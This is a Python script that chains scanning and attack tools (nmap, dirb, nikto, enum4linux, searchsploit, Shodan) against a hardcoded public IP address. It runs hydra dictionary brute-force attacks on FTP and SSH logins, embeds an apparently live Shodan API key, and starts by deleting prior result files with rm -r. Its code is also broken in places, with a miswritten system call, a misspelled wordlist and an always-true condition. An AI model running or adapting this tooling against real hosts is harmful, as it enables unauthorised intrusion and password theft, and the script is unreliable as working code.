import os
import shodan
import csv

clear_dump='rm -r nmap_results.csv'
clear_dump1='rm -r nmap_results.xml'
clear_dump2='clear'
os.system(clear_dump)
os.system(clear_dump1)
os.system(clear_dump2)

SHODAN_API_KEY = "XGPN8vDnyZ0YYNL1Lp6vnHNPFpAmDd3e"
api = shodan.Shodan(SHODAN_API_KEY)
#Check if the hosts is alive or not
#ip=str(input("Enter target IP in quotes: "))
ip='148.72.93.10'
check_live_host='ping -c 1 '+ip
ping_output = os.system(check_live_host)	
#Run an NMAP scan after checking host life
print("\n\nRunning NMAP to identify services, versions and ports....\n\n")
run_nmap = 'nmap -sV -p 80 -T4 -oX nmap_results.xml '+ip+ '>>'+ip+'.txt'
os.system(run_nmap)
os.system('python3 nmap_xml_parser.py -f nmap_results.xml -csv nmap_results.csv')
nmap_source=open('nmap_results.csv','r')
nmap_output=csv.reader(nmap_source, delimiter=',')

for row in nmap_output:
	#Run a dirb scan on the respective port if website is running
	if 'http' in row:
		print("\n\nHTTP detected, running dirb to enumerate directories....\n\n")
		print(row[4])
		run_dirb= 'dirb http://'+ip+':'+row[4]+ '>>'+ip+'.txt'
		#dirb_output=os.system(run_dirb)

	#If the host has ftp service running, run a brute force attack
	if 'ftp' in row:
		print("\n\nFTP detected, running hydra to try and dictionary attack username and password....\n\n")
		run_hydra_ftp='hydra -l admin -P rockyou.txt ftp://'+ip+ '>>'+ip+'.txt'
		hydra_ftp_output=system.os(run_hydra_ftp)

	#If the host has ssh service running, run a brute force attack
	if 'ssh' in row:
		print("\n\nSSH detected,running hydra to bruteforce with admin....\n\n")
		run_hydra_ssh='hydra -l admin -P rocckyou.txt ssh://'+ip+ '>>'+ip+'.txt'
	#If the host has Ubuntu running, run a service enumeration
	if 'Ubuntu' or 'Linux' or 'Unix' in row:
		print("\n\nLinux detected, running Enum4Linux now....\n\n")
		run_enum4linux='enum4linux -a '+ip+ '>>'+ip+'.txt'
		os.system(run_enum4linux)

#Run Nikto web scanner on the target IP to find vulns
print("\n\nRunning NIKTO to try and identify vulnerabilities on the website....\n\n")
run_nikto = 'nikto -url http://'+ip+ '>>'+ip+'.txt'
nikto_output=os.system(run_nikto)

#Take NMAP output and search all discovered services for vulns
print("\n\nSearching for possible exploits....\n\n")
run_searchsploit= 'searchsploit --nmap nmap_results.xml'+ '>>'+ip+'.txt'
print("\n\nUsable exploits are....\n\n")
searchsploit_output=os.system(run_searchsploit)
	#Take the targeted IP and search it on shodan for available services and information gathering
print("\n\nSearching for digital footprint....\n\n")
shodan_search = api.host(ip)
shodan_log= 'shodan_search >> '+ip+'.txt'
os.system(shodan_log)
#shodan_output=os.system(shodan_search)
#print("\n\nNumber of matches from shoadan on target is:"+str(shodan_search))
	#End of code
print("\n\n\nMonday has finished")
